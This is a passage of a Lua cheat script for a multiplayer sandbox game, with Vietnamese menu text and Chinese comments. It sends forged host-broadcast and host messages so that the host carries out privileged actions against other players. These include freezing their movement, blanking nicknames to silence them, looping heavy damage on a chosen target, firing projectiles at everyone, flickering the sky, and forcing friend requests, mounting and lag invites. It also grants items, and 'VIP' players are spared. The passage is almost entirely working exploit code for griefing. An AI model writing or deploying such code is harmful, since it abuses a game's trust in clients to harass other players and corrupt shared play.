            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.sd_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu điều khiển tốc độ",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần điều khiển tốc độ")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu điều khiển")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                        _G.sd_enabled = false  -- 停止本次
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp điều khiển tốc độ")
                
                -- 启动速度控制循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.sd_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 速度控制代码 =====
                        -- 参数说明：{uin, x速度, y速度, z速度}
                        -- 设置0,0,0可以让玩家无法移动
                        local tdata = {}
                        tdata[1] = "actor"
                        tdata[2] = "appendSpeed"
                        tdata[3] = {targetUin, 1, 0, 1}  -- 停止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                        -- =======================
                        
                        -- 每10次显示一次提示
                        
                        
                        threadpool:wait(0.1)  -- 0.1秒执行一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp điều khiển tốc độ đã kết thúc")
                end)
            end
            -- ====================
        end
    end
)
end


function jywj()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 修改玩家名字功能（选择目标后立即修改）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái hủy\nBên phải chọn mục tiêu để cấm chat",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：取消
            ShowGameTipsWithoutFilter("#cFF0000Đã hủy")
            
        elseif btnType == 1 then  -- 右边按钮：选择目标
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn người chơi cần cấm chat",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần cấm chat")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để cấm chat")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                -- ===== 修改名字代码（只执行一次）=====
                local tdata = {}
                tdata[1] = "actor"
                tdata[2] = "setnickname"
                tdata[3] = {targetUin, " "}
                
                pcall(function() 
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    ShowGameTipsWithoutFilter("#c00ffffĐã thay đổi người chơi " .. targetUin .. " trạng thái cấm chat")
                end)
                -- ===================================
            end
        end
    end
)
end


function wjzc()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 玩家自残功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng tự gây sát thương\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止自残 =====
            _G.zc_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng tự gây sát thương")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启自残 =====
            _G.zc_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.zc_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.zc_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu tự gây sát thương",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần tự gây sát thương")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu tự gây sát thương")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                        _G.zc_enabled = false  -- 停止本次秒杀
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp tự gây sát thương")
                
                -- 启动自残循环
                threadpool:work(function()
                    local loopCount = 0
                    local myUin = AccountManager:getUin()
                    
                    while _G.zc_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 自残代码 =====
                        -- 参数说明：{攻击者UIN, 受害者UIN, 伤害值, 未知参数}
                        -- 这里让玩家攻击自己（自残）
                        local tdata = {
                            [1] = "actor",
                            [2] = "playerHurt",
                            [3] = {targetUin, targetUin, 5000, 0}  -- 自己打自己
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                        -- ===================
                        
              
                        
                        threadpool:wait(0.1)  -- 0.2秒自残一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp tự gây sát thương đã kết thúc,")
                end)
            end
            -- ====================
        end
    end
)
end

function ztmn()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng phá bản đồ\nBên phải bật phá bản đồ",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止炸图 =====
            _G.ztmn_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng phá bản đồ")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启炸图 =====
            _G.ztmn_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffĐã bật phá bản đồ")
            
            -- 启动炸图循环
            threadpool:work(function()
                while _G.ztmn_enabled do
                    -- 获取当前房间所有玩家
                    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                    local myUin = AccountManager:getUin()
                    
                    for i = 1, size do
                        if not _G.ztmn_enabled then break end
                        
                        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                        if targetPlayer then
                            local targetUin = targetPlayer:getUin()
                            if targetUin ~= myUin then
                                -- 获取目标位置
                                local x, z, y = targetPlayer:getPosition(0, 0, 0)
                                local scaled_x, scaled_y, scaled_z = x * 0.01, y * 0.01, z * 0.01
                                
                                -- 获取自己位置
                                local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                                local new_x, new_y, new_z = my_x / 100, my_y / 100, my_z / 100
                                
                                -- 发射投掷物（火龙果）
                                local tdata = {
                                    [1] = "world",
                                    [2] = "spawnProjectile",
                                    [3] = {myUin, 15056, new_x, new_y, new_z, scaled_x, scaled_y, scaled_z, 500}
                                }
                                pcall(function() 
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                                end)
                            end
                        end
                    end
                    
                    threadpool:wait(0.1)  -- 0.1秒发射一轮
                end
            end)
            -- ====================
        end
    end
)
end
function gbtk()
-- 改变天空功能（左边停止，右边开启）
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng nhấp nháy bầu trời\nBên phải bật nhấp nháy bầu trời",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止天空闪烁 =====
            _G.skybox_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng nhấp nháy bầu trời")
            
            -- 恢复默认天空盒
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.skybox_enabled then
                    local tdata = {
                        [1] = "world",
                        [2] = "SetSkyBoxMaps",
                        [3] = {0, 0, ""}
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    end)
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục skybox mặc định")
                end
            end)
            -- =========================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启天空闪烁 =====
            _G.skybox_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffĐã bật nhấp nháy bầu trời")
            
            -- 启动天空闪烁循环
            threadpool:work(function()
                local skyboxIds = {30005, 30006, 30007, 30008, 30009}
                local index = 1
                
                while _G.skybox_enabled do
                    -- 设置天空盒
                    local tdata = {
                        [1] = "world",
                        [2] = "SetSkyBoxMaps",
                        [3] = {1, skyboxIds[index], ""}
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    end)
                    
                    -- 切换到下一个
                    index = index + 1
                    if index > #skyboxIds then index = 1 end
                    
                    threadpool:wait(0.2)  -- 0.3秒切换一次
                end
            end)
            -- =========================
        end
    end
)
end


function sjls()
    -- 先检查是否在游戏中
    if not ClientCurGame or not ClientCurGame:isInGame() then
        ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
        return
    end
    
    tdata = {}
    tdata[1] = "world";
    tdata[2] = "SetTimeVanishingSpeed";
    tdata[3] = {100}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function czzy()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    local size = 10
    local start_x = base_x + 5
    local top_y = base_y + size
    
    for dx = 0, size - 1 do
        local current_x = start_x + dx
        for dy = 0, size - 1 do
            local current_y = base_y + dy
            for dz = 0, size - 1 do
                local current_z = base_z - dz
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 835, current_x, current_y, current_z, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
    
    local gap = (size - 1) / 4
    for i = 0, 4 do
        local pos_x = start_x + i * gap
        local pos_z = base_z - (size - 1) / 2
        local pos_y = top_y + 0.5
        
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 6, pos_x, pos_y, pos_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end

function tdwg()
for a = 0, 100000 do
        threadpool:wait(0.1)
        local tdata1 = {
            [1] = "graphics",
            [2] = "createGraphicsTxtByActor",
            [3] = { AccountManager:getUin(), { title = "#cFFAAFFH#cFFBBEEA#cFFCCDDI #cFFDDCCC#cFFEEBBA x #cFFAAFFM#cFFBBEEX#cFFCCDDI#cFFDDCCI", fontsize = 20, apha = 5, itype = 2, Type = 'GRAPHICS.GRAPHICS_HORNBOOK' }, { x = 0, y = 160, z = 0 }, 1.2, 0, 115 }
        }
        local tdata2 = {
            [1] = "graphics",
            [2] = "createGraphicsImageByActor",
            [3] = { AccountManager:getUin(), { imgid = 10099, scale = 0.7, apha = 90, id = 1, Type = 'GRAPHICS.GRAPHICS_IMAGE' }, { x = 0, y = 50, z = 0 }, 1, 0, 150 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
    end
end

function qseb()
 getglobal("AccChangeColorBtn"):Show()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        getglobal("AccSummonBtn"):SetPoint("right", "AccRideChangeBtn", "left", -80, 0)
        threadpool:work(function()
            getglobal("AccSummonBtn"):Show()
            
            function AccSummonBtn_OnClick()
                math.randomseed(os.time() + math.random())
                local idList = {
                    "mob_3101", "mob_3101", "mob_3102", "mob_3105", "mob_3107",
                    "mob_3109", "mob_3121", "mob_3130", "mob_3131", "mob_3244",
                    "mob_3255", "mob_3411", "mob_3416", "mob_3418", "mob_3419",
                    "mob_3419", "mob_3420", "mob_3425", "mob_3502", "mob_3521",
                    "mob_3600", "mob_3601", "mob_3608", "mob_3803"
                }
                
                if #idList == 0 then
                    ShowGameTipsWithoutFilter("idList is empty")
                    return
                end
                
                local randomIndex = math.random(1, #idList)
                local selectedId = idList[randomIndex]
                
                local tdata = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = { AccountManager:getUin(), selectedId }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter("" .. selectedId)
            end
        end)
    end
end

function sjyd()
  getglobal("AccChangeColorBtn"):Show()
for a = 0, 100000 do
        threadpool:wait(0.1)
        getglobal("EditorBackBtn"):SetPoint("bottomleft", "PlayMainFrame", "bottomleft", 1120, -400)
        threadpool:work(function()
            getglobal("EditorBackBtn"):Show()
            
            function EditorBackBtn_OnClick()
                for a = 0, 5 do
                    threadpool:wait(0.01)
                    CurMainPlayer:playSkinAct(20, AccountManager:getUin(), AccountManager:getUin())
                end
            end
        end)
    end
end

function csfy()
    if not ClientCurGame or ClientCurGame._originalSendChat then return end
    
    local START_R, START_G, START_B = 255, 170, 255
    local END_R, END_G, END_B = 255, 238, 187
    
    local function padHex(num) return string.format("%02X", num) end
    
    local function getGradientColor(index, total)
        if total <= 1 then return "#c" .. padHex(START_R) .. padHex(START_G) .. padHex(START_B) end
        local ratio = (index - 1) / (total - 1)
        local r = math.floor(START_R + (END_R - START_R) * ratio + 0.5)
        local g = math.floor(START_G + (END_G - START_G) * ratio + 0.5)
        local b = math.floor(START_B + (END_B - START_B) * ratio + 0.5)
        return "#c" .. padHex(r) .. padHex(g) .. padHex(b)
    end
    
    local function applyColorToText(str)
        local ok, rawStr = pcall(tostring, str or "")
        if not ok or rawStr == "" then return str or "" end
        
        local char_list = {}
        local i = 1
        while i <= #rawStr do
            local c = rawStr:byte(i)
            local len = 1
            if c >= 192 and c <= 223 then len = 2
            elseif c >= 224 and c <= 239 then len = 3
            elseif c >= 240 and c <= 247 then len = 4 end
            table.insert(char_list, rawStr:sub(i, i + len - 1))
            i = i + len
        end
        
        local result = {}
        for idx, char in ipairs(char_list) do
            table.insert(result, getGradientColor(idx, #char_list) .. char)
        end
        return table.concat(result)
    end
    
    local originalSendChat = ClientCurGame.sendChat
    ClientCurGame._originalSendChat = originalSendChat
    
    function ClientCurGame:sendChat(originalMsg)
        local coloredMsg = originalMsg
        local ok, res = pcall(applyColorToText, originalMsg)
        if ok then coloredMsg = res end
        
        if type(originalSendChat) == "function" then
            originalSendChat(self, coloredMsg)
        else
            ClientCurGame.sendChat(self, coloredMsg)
        end
    end
end

function czjb()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    for dx = -1, 1 do
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 1, base_x + dx, base_y, base_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    
    for dy = 1, 3 do
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 1, base_x, base_y + dy, base_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end

function czjy()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    -- 中型监狱尺寸
    local width = 15      -- X轴方向宽度
    local height = 8      -- Y轴方向高度
    local depth = 15      -- Z轴方向深度
    
    local start_x = base_x + 5   -- 从玩家位置稍微偏移
    local start_y = base_y       -- 从玩家脚下开始
    local start_z = base_z - 8   -- 向后偏移
    
    print("开始创建中型露天监狱（15x8x15）")
    
    -- 创建四周墙壁和地板
    for dx = 0, width - 1 do
        for dy = 0, height - 1 do
            for dz = 0, depth - 1 do
                
                -- 墙壁或地板（不包括顶部）
                local isWall = (dx == 0 or dx == width - 1 or    -- 前后墙
                               dz == 0 or dz == depth - 1 or    -- 左右墙
                               dy == 0)                          -- 地板
                
                if isWall and dy < height - 1 then  -- 排除顶部
                    local current_x = start_x + dx
                    local current_y = start_y + dy
                    local current_z = start_z + dz
                    
                    local tdata = {
                        [1] = "block",
                        [2] = "placeBlock",
                        [3] = { 1, current_x, current_y, current_z, 0, -1 }
                    }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end
            end
        end
    end
    
    -- 放置顶部空气方块
    local top_y = start_y + height - 1
    for dx = 0, width - 1 do
        for dz = 0, depth - 1 do
            local current_x = start_x + dx
            local current_z = start_z + dz
            
            local air_data = {
                [1] = "block",
                [2] = "placeBlock",
                [3] = { 1001, current_x, top_y, current_z, 0, -1 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, air_data)
        end
    end
    
    -- 创建入口（正面中间）
    local doorX = start_x + math.floor(width / 2)
    local doorY = start_y + 1
    local doorZ = start_z
    
    print("中型露天监狱创建完成！")
    print("- 尺寸：宽15 x 高8 x 深15")
    print("- 入口位置：X="..doorX..", Y="..doorY..", Z="..doorZ)
end
                   



-- ==================== 基础功能 ====================
function czhh()
-- 生成五层巨型花环（每层明显分开）

    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local center_x, center_y, center_z = x / 100, y / 100, z / 100
    
    -- 五层鲜花ID
    local flowerIds = {200398, 200405, 200417, 200398, 200405,200398,200405,200417,200398,200417,200405}
    
    -- 五层半径：15, 30, 45, 60, 75米（稍微拉大间距）
    local radius = {5.0,10.0,15.0,20.0,25.0, 30.0,35.0,40.0, 45.0, 60.0, 75.0}
    
    -- 五层花朵数量（按周长比例增加）
    local flowerCount = {
    math.floor(2 * math.pi * 5 * 0.8),   -- 约75朵
    math.floor(2 * math.pi * 10 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 15 * 0.8), 
        math.floor(2 * math.pi * 20 * 0.8),   -- 约75朵  
        math.floor(2 * math.pi * 25 * 0.8),   -- 约75朵
        
        math.floor(2 * math.pi * 30 * 0.8),   -- 约150朵
        math.floor(2 * math.pi * 35 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 40 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 45 * 0.8),   -- 约226朵
        math.floor(2 * math.pi * 60 * 0.8),   -- 约301朵
        math.floor(2 * math.pi * 75 * 0.8)    -- 约377朵
    }
    
    ShowGameTipsWithoutFilter("#c00ff00Bắt đầu tạo vòng hoa khổng lồ 11 tầng")
    ShowGameTipsWithoutFilter("#c00ff00Tổng số hoa khoảng" .. (flowerCount[1]+flowerCount[2]+flowerCount[3]+flowerCount[4]+flowerCount[5]+flowerCount[6]+flowerCount[7]+flowerCount[8]+flowerCount[9]+flowerCount[10]+flowerCount[11]) .. " bông")
    
    -- 地面基础高度
    local ground_y = center_y + 0.2
    
    for layer = 1, 11 do
        local currentFlowerId = flowerIds[layer]
        local currentRadius = radius[layer]
        local currentCount = flowerCount[layer]
        
        ShowGameTipsWithoutFilter("#cFFAA00Đang tạo tầng " .. layer .. ", bán kính" .. currentRadius .. " mét, khoảng cách" .. (radius[layer] - (radius[layer-1] or 0)) .. " mét")
        
        for i = 1, currentCount do
            -- 均匀分布角度
            local angle = (i - 1) * (2 * math.pi / currentCount)
            
            -- 稍微加一点随机偏移，让花环更自然（但不影响层间距）
            local rand_angle = (math.random() - 0.5) * 0.1
            local rand_radius = (math.random() - 0.5) * 0.3
            local final_angle = angle + rand_angle
            local final_radius = currentRadius + rand_radius
            
            -- 计算坐标
            local offset_x = math.cos(final_angle) * final_radius
            local offset_z = math.sin(final_angle) * final_radius
            
            local flower_x = center_x + offset_x
            local flower_z = center_z + offset_z
            
            -- 所有花都种在地上
            local tdata = {
                [1] = "block",
                [2] = "placeBlock",
                [3] = { currentFlowerId, flower_x, ground_y, flower_z, 0, -1 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            
            threadpool:wait(0.003)
        end
        
        threadpool:wait(0.1)
    end
    

end

function zdhy()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "SendFriendApply",
            [3] = { uin, AccountManager:getUin() }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Ép kết bạn")
end


function jxfk()
for a = 0, 100000 do
        threadpool:wait(0.1)
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, (y / 100) - 1, z / 100
    local tdata = {
        [1] = "block",
        [2] = "placeBlock",
        [3] = { 1, new_x, new_y, new_z, 0, -1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end


function qxwj()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "mountActor",
            [3] = { AccountManager:getUin(), uin, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Cưỡi lên người chơi")
end


function Fxms(aa)
    threadpool:work(function()
        if ClientCurGame:isInGame() then
            threadpool:wait(0.01)
            CurMainPlayer:setFlying(aa)
        else
            ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
        end
    end)
end

function ydfh(aa)
    if CurWorld and CurMainPlayer then
        trigger()
        local HP = GameVM.Trigger.Player:getPlayerAttr(AccountManager:getUin(), PLAYERATTR.CUR_HP)
        if HP < 0 then
            ClientCurGame:getMainPlayer():revive(1)
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { AccountManager:getUin(), 520, 23 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

function ydfh_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aadBật thành công')
    ydfh_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aadChưa vào bản đồ, bật thất bại")
                break
            end
            ydfh(aa)
            threadpool:wait(0.01)
            if not ydfh_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aadTắt thành công")
                break
            end
        end
    end)
end

function wdtz(aa)
    CurMainPlayer:tryShapeShift(80)
    CurMainPlayer:jumpOnce()
end

function wdtz_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aadBật thành công')
    wdtz_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
                break
            end
            wdtz(aa)
            threadpool:wait(0.1)
            if not wdtz_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aadTắt thành công")
                break
            end
        end
    end)
end

function rwdx()
    if ClientCurGame:isInGame() then
        local player = CurMainPlayer
        player:setCustomScale(4)
        player:syncCustomScale()
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function rwtx()
    if ClientCurGame:isInGame() then
        for i = 1, #effectNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { AccountManager:getUin(), effectNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function rwjs_speed()
    if ClientCurGame:isInGame() then
        GameVM.Creature:setWalkSpeed(AccountManager:getUin(), 100)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function zhjqr()
    if ClientCurGame:isInGame() then
        local content = { summonid = "4901", objid = AccountManager:getUin() }
        SandboxLuaMsg.sendToHost("AVATAR_SUMMON_TOHOST", content)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function zdjqr()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local content = { summonid = "4901", objid = uin }
        SandboxLuaMsg.sendToHost("AVATAR_SUMMON_TOHOST", content)
    end, "Chỉ định robot")
end

function zdkr()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local content = {
            msg = "transfer_invited",
            inviterUin = AccountManager:getUin(),
            inviterName = "",
            beInvitedUin = uin
        }
        SandboxLuaMsg.sendToHost("TELEPORT_SEND_INVITE_TOHOST", content)
    end, "Chỉ định làm lag người chơi")
end

function tjzd()
    if ClientCurGame:isInGame() then
        local content = { role_id = AccountManager:getUin(), itemid = 15056, itemnum = 999 }
        SandboxLuaMsg.sendToHost("DEVELOPERSTORE_EXTRASTOREITEM_TOHOST", content)
